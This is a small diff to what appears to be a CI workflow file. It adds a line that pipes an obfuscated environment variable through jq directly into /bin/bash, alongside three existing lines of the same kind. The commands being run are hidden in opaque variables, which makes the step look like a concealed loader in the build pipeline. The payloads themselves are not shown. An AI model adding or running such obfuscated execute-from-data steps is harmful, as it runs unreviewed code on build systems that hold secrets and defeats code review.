@@ -40,6 +40,7 @@ jobs:
           echo $al87282 | jq -r .kttn275 | /bin/bash
           printf '%s' "$wnyvs01" | jq -r .ltc72 | /bin/bash
           printf '%s' "$lhube68" | jq -r .xjti30223 | /bin/bash
+          printf '%s' "$ko5" | jq -r .wfts0130 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
